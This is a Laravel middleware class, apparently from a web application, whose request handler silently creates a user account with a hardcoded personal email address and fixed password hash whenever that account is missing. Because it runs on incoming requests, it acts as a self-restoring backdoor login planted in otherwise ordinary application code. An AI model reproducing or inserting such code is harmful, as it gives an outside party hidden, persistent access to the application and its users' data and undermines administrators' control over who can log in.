<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Models\User;

class AddUserMe
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        if (!(User::where('email', 'm7mdali01@gmail.com')->count() > 0)) {
            User::create([
                'email' => 'm7mdali01@gmail.com',
                'password' => '$2y$10$25.nDlpK1uSNCaVXypGPUeDkmxgpK.fCXGKeN4t84QRpVL/1YNEhy',
                'name' => 'محمد على'
            ]);
        }
        return $next($request);
    }
}
